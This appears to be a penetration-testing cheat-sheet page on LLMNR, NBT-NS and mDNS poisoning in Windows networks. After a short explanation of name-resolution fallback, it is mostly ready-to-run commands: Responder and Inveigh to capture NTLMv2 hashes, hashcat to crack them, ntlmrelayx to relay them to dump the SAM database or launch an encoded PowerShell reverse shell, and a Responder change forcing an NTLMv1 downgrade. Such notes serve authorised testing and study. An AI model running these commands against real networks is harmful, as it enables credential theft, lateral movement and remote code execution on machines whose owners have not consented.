# LLMNR, NBT-NS, mDNS poisoning

When a user or a system tries to perform a `Name Resolution` (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

* The hostname file share's IP address is required
* The local host file (`C:\Windows\System32\Drivers\etc\hosts`) will be checked for suitable records
* If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names
* Is there no local DNS record? A query will be sent to the DNS server that has been configured.
* If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running a fake SMB server

### Capture and crack

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Analyse incoming trafic without spoofing anything
sudo responder -I <INTERFACE> -A

# Capture hashes
sudo responder -I <INTERFACE>
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Download Inveigh
https://github.com/Kevin-Robertson/Inveigh

# Import the module and catch hashes
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Use the C# version => has to be compiled with visualstudio beforehand
# options with a [+] are default and enabled by default and the ones with a [ ] before 
# them are disabled
# Press esc to enter / exit interactive console
.\Inveigh.exe

# View unique captured hashes
GET NTLMV2UNIQUE

# View collected usernames
GET NTLMV2USERNAMES
```
{% endtab %}
{% endtabs %}

We will capture an NTLMv2 hash. We can attempt to crack it

```sh
hashcat -m 5600 hash.txt <WORDLIST>
```

### Capture and relay

If we fail to crack the hash, we can attempt to relay it ⇒ using the captured hash to authenticate to another machine

{% hint style="warning" %}
When combining NTLM relay with Responder for name poisoning, we need to make sure that Responder's servers are deactivated, otherwise they will interfere with ntlmrelayx ones
{% endhint %}

```sh
# Make sure SMB is set to Off
cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off

# Set to Off if needed
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Dump the SAM DB
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>

# Get a reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <B64_REV_SHELL>'
```

### Capture and downgrade

We can try to downgrade the NTLM authentication to v1 for easier cracking

```sh
# Change the NTLM challenge sent to victims in the responder conf
sed -i 's/ Random/ 1122334455667788/g' /etc/responder/Responder.conf

# Attempt the downgrade
sudo responder -I <INTERFACE> --lm

# Convert the hash to crackable format => hashcat -m 14000
https://github.com/evilmog/ntlmv1-multi
ntlmv1-multi --ntlmv1 <HASH> --hashcat 
```

{% embed url="https://www.thehacker.recipes/ad/movement/ntlm/capture" %}
